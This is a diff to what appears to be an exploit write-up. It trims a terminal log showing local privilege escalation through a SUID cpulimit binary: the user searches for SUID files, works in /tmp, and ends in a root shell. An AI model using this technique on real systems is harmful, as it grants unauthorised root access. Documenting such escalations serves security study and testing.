@@ -2,10 +2,8 @@
 
 
 ```bash
-user@victim:~$ whoami && id && hostname
+user@victim:~$ whoami
 user
-uid=1000(user) gid=1000(user) grupos=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
-victim
 user@victim:~$ find / -perm -4000 2>/dev/null | grep "cpulimit"
 /usr/bin/cpulimit
 user@victim:~$ cd /tmp/
@@ -22,9 +20,6 @@ Child process is finished, exiting...
 [+]  getting a shell as root.. 
 bash-5.0# whoami && id && hostname
 root
-uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(user)
-victim
-bash-5.0# 
 ```
 
 **Screenshot**
